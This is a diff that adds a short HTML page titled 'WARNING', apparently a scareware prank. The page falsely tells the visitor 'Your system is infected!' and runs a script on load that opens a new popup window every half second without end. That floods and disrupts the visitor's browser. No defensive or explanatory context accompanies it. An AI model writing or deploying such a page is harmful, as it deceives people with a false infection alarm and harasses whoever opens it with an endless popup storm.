@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WARNING</title>
+  <script>
+    function popupStorm() {
+      setInterval(() => {
+        window.open("https://example.com", "_blank", "width=300,height=200");
+      }, 500);
+    }
+  </script>
+</head>
+<body onload="popupStorm()">
+  <h1 style="color:red;text-align:center">Your system is infected!</h1>
+</body>
+</html>
